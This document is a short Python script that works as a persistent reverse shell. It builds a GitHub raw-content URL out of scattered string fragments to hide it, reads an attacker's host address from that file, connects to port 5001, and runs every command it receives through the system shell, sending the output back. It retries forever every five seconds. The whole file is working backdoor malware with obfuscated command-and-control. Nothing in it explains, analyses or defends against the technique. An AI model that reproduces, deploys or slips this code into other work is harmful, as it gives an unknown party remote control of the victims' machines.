def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
z = "el31"
def process(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	else:
		proc = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return False
ww = "m/mi"
def main():
	uwyd = "535/test/main"
	while True:
		try:
			br = "aw.gith"
			h = urllib.request.urlopen("https://r"+br+"ubusercontent.co"+ww+"cha"+z+"415926"+uwyd+"/asdf1.txt").read().decode("utf-8").replace("\n","")
			while True:
				socketDied=False
				try:
					s=connect(h.strip(),5001)
					while not socketDied:
						s.send(b"\n>> ")
						socketDied=process(s)
					s.close()
				except Exception:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
if __name__ == "__main__":
	import sys,subprocess,socket,time,urllib.request
	sys.exit(main())
